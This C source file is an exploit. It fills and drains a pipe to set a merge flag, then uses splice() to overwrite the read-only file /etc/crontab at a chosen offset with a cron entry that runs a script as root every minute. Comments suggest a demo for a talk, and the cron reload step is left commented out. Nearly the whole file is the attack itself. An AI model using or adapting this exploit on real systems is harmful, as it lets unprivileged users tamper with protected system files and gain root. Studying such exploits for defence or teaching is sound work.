#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/types.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

#define PIPE_BUFFER_COUNT 16


int main(int argc, char **argv) {

  int p[2];

  pipe(p);
  char buf[16*PAGE_SIZE];

  // fill and then drain the pipe to set PIPE_BUF_FLAG_CAN_MERGE flag
  write(p[1], buf, 16*PAGE_SIZE);
  read(p[0], buf, 16*PAGE_SIZE);

  char target_file[] = "/etc/crontab";
  int fd_target = open(target_file, O_RDONLY);

  // want to overwrite the following line with 947 characters offset and 93 characters in total
  // 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  loff_t offset_target = 945;
  // splice 1 byte of target file into the pipe
  splice(fd_target, &offset_target, p[1], NULL, 1, 0);

  // for testing after 1 minute, for talk after 7 minutes?
  char data[] = "*  *  *  *  *   root    bash /code/mystery > /dev/pts/0 2>&1                                           ";
  write(p[1], data, 101);

  // problem cron job does not recognize new file, maybe open it and write
  /* char *args[] = {"cron", "reload", NULL}; */
  /* execv("/etc/init.d/cron", args); */
}
